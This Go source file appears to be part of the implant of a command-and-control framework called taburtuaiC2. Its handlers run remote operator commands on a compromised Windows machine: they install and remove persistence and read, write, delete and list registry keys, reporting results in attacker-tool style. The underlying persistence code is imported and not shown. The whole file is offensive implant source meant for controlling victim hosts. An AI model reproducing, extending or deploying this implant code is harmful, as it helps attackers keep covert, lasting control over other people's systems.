package main

import (
	"fmt"
	"strings"

	"github.com/mjopsec/taburtuaiC2/implant/persist"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

func handlePersistenceSetup(cmd *types.Command, result *types.CommandResult) {
	if err := persist.SetupPersistence(cmd.PersistMethod, cmd.PersistName, cmd.ProcessPath, cmd.ProcessArgs); err != nil {
		result.Error = fmt.Sprintf("Failed to setup persistence: %v", err)
		result.ExitCode = 1
	} else {
		result.Output = fmt.Sprintf("Persistence configured: %s", cmd.PersistMethod)
	}
}

func handlePersistenceRemove(cmd *types.Command, result *types.CommandResult) {
	if err := persist.RemovePersistence(cmd.PersistMethod, cmd.PersistName); err != nil {
		result.Error = fmt.Sprintf("Failed to remove persistence: %v", err)
		result.ExitCode = 1
	} else {
		result.Output = "Persistence removed successfully"
	}
}

func handleRegRead(cmd *types.Command, result *types.CommandResult) {
	if cmd.RegHive == "" || cmd.RegKey == "" || cmd.RegValue == "" {
		result.Error = "reg_hive, reg_key, reg_value required"
		result.ExitCode = 1
		return
	}
	val, err := persist.RegRead(cmd.RegHive, cmd.RegKey, cmd.RegValue)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("%s\\%s\\%s = %s", cmd.RegHive, cmd.RegKey, cmd.RegValue, val)
}

func handleRegWrite(cmd *types.Command, result *types.CommandResult) {
	if cmd.RegHive == "" || cmd.RegKey == "" || cmd.RegValue == "" {
		result.Error = "reg_hive, reg_key, reg_value required"
		result.ExitCode = 1
		return
	}
	if err := persist.RegWrite(cmd.RegHive, cmd.RegKey, cmd.RegValue, cmd.RegData, cmd.RegType); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Written %s\\%s\\%s", cmd.RegHive, cmd.RegKey, cmd.RegValue)
}

func handleRegDelete(cmd *types.Command, result *types.CommandResult) {
	if cmd.RegHive == "" || cmd.RegKey == "" {
		result.Error = "reg_hive and reg_key required"
		result.ExitCode = 1
		return
	}
	if err := persist.RegDelete(cmd.RegHive, cmd.RegKey, cmd.RegValue); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if cmd.RegValue != "" {
		result.Output = fmt.Sprintf("[+] Deleted value %s\\%s\\%s", cmd.RegHive, cmd.RegKey, cmd.RegValue)
	} else {
		result.Output = fmt.Sprintf("[+] Deleted key %s\\%s", cmd.RegHive, cmd.RegKey)
	}
}

func handleRegList(cmd *types.Command, result *types.CommandResult) {
	if cmd.RegHive == "" || cmd.RegKey == "" {
		result.Error = "reg_hive and reg_key required"
		result.ExitCode = 1
		return
	}
	entries, err := persist.RegList(cmd.RegHive, cmd.RegKey)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if len(entries) == 0 {
		result.Output = "(empty key)"
		return
	}
	result.Output = strings.Join(entries, "\n")
}
